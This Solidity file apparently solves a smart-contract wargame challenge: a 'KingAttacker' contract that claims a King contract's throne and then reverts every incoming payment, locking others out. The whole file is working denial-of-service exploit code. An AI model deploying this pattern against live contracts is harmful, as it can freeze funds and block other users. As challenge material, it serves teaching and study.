// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract KingAttacker {
  King king;

  constructor(address _king) {
    king = King(payable(_king));
  }

  function attack() external payable{
    (bool success, ) = address(king).call{value: msg.value}("");
    if(!success) revert();
  }

  receive() external payable{
    assert(false);
  }
}